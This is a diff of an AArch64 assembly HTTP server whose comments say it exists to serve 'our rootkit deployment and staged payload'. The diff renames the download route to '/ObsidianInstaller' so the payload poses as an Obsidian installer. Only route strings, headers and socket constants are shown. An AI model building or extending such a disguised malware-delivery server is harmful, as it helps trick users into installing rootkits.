@@ -2,7 +2,6 @@
 // Aarch64 ASM HTTP Server
 // This is going to download our rootkit deployment and staged payload
 /////////////////////////////////////////////////////////////////////////
-
 true: .word 1
 
 // New Line
@@ -11,9 +10,9 @@ newline: .ascii "\n"
 // Index Route
 .align 4
 index_route: .ascii "GET /"
-// Download Route
+// Download Route (We are going to call it ObsidianMD)
 .align 4
-download_route: .ascii "GET /ObsidianMD"
+download_route: .ascii "GET /ObsidianInstaller"
 // No Route 
 .align 4
 no_response_found:
@@ -25,16 +24,14 @@ ok_download_resource:
     .ascii "HTTP/1.1 200 OK\nContent-Type: application/octet-stream\n\r\n"
 ok_download_resource = . - ok_download_resource
 
-
 .data 
 
-server_fd: .quad 0
-client_fd: .quad 0
+server_fd: .quad 0 // Server File Descriptor
+client_fd: .quad 0 // Client File Descriptor 
 
-
-.equ SOL_SOCKET, 0xffff
-.equ SO_REUSERADDR, 0x4
-.equ buffer, 1024
+.equ SOL_SOCKET, 0xffff // SOL_SOCKET
+.equ SO_REUSERADDR, 0x4 // REUSEADDR
+.equ buffer, 1024 // Buffer Size
 
 sockaddr:
     .short 2 // AF_INET
